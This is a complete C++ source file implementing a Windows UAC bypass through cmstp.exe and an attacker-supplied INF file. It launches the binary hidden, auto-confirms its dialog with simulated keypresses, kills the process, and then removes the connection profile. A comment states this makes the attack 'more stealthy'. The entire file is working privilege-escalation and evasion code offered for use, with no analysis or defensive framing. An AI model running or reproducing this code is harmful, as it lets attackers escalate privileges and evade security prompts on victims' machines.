#include <windows.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include <shellapi.h>


class CMSTPBypass {
private:
    static void KillProcess(const std::string& processName) {
        // Conversion string -> wstring to compare with szExeFile
        std::wstring wProcessName(processName.begin(), processName.end());
        
        // Take a snapshot of the system
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return;
        
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        
        // Enumerate through every processes of the system until finding the right one
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (wProcessName == pe.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

public:
    static bool Execute(const std::string& infFile) {
        const std::string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
        std::string arguments = "/au " + infFile;

        // Check if file exists
        DWORD dwAttrib = GetFileAttributesA(infFile.c_str());
        if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
            std::cerr << "[-] Error: INF file not found." << std::endl;
            return false;
        }

        HINSTANCE result = ShellExecuteA(NULL, "open", BinaryPath.c_str(), arguments.c_str(), NULL, SW_HIDE);
        if ((INT_PTR)result <= 32) {
            std::cerr << "[-] ShellExecute failed with error code: " << (INT_PTR)result << std::endl;
            return false;
        }

        Sleep(3000); 

        // Find the dialog box
        HWND hwnd = NULL;
        for (int i = 0; i < 10 && hwnd == NULL; i++) {
            hwnd = FindWindowA(NULL, "Network1"); // Vérifie bien le titre de la fenêtre INF
            if (!hwnd) Sleep(500);
        }

        if (hwnd) {
            std::cout << "[+] Found CMSTP window handle." << std::endl;
            PostMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0);
            PostMessage(hwnd, WM_KEYUP, VK_RETURN, 0);
        } else {
            std::cerr << "[-] Error: Could not find the CMSTP dialog box (Title: Network1). Check the .inf file or timing." << std::endl;
        }

        Sleep(2000);
        
        // Kill CMSTP.exe process because it often stays in bg
        KillProcess("cmstp.exe");
        std::cout << "[+] CMSTP process terminated." << std::endl;

        // Delete the profile to make it more stealthy
        std::string removearg = "/s /u " + infFile;
        HINSTANCE removeresult = ShellExecuteA(NULL, "open", BinaryPath.c_str(), removearg.c_str(), NULL, SW_HIDE);
        std::cout << "[+] Network connection \"Network1\" removed." << std::endl;

               
        return true;
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <INF_FILE>" << std::endl;
        return 1;
    }

    std::string infFile = argv[1];

    if (CMSTPBypass::Execute(infFile)) {
        std::cout << "[*] UAC Bypass sequence completed." << std::endl;
    } else {
        std::cerr << "[-] UAC Bypass failed." << std::endl;
    }

    return 0;
}